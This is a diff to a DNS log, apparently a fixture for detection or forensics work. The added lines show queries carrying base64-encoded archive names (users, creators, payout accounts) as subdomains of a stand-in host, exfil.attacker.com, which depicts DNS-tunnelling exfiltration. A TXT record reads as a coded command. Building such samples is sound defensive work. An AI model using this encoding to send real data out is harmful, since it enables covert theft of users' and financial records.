@@ -1,5 +1,7 @@
 2026-02-14T03:14:21Z client=10.10.10.23 query=api.example.internal type=A answer=10.10.10.23
 2026-02-14T03:15:02Z client=10.10.10.23 query=cdn-sync-assets.com type=A answer=185.199.110.153
 2026-02-14T03:18:17Z client=10.10.10.23 query=cdn-sync-assets.com type=A answer=185.199.110.153
-2026-02-14T03:31:44Z client=10.10.10.23 query=cdn-sync-assets.com type=A answer=185.199.110.153
+2026-02-14T03:31:44Z client=10.10.10.23 query=dXNlcnMudGFyLmd6.data.exfil.attacker.com type=A answer=203.0.113.200
+2026-02-14T03:31:45Z client=10.10.10.23 query=Y3JlYXRvcnMudGFyLmd6.data.exfil.attacker.com type=A answer=203.0.113.200
+2026-02-14T03:31:46Z client=10.10.10.23 query=cGF5b3V0X2FjY291bnRzLnRhci5neg.data.exfil.attacker.com type=A answer=203.0.113.200
 2026-02-14T03:34:11Z client=10.10.10.23 query=cdn-sync-assets.com type=TXT answer="cHV0LXVwbG9hZC1ub3cteW91"
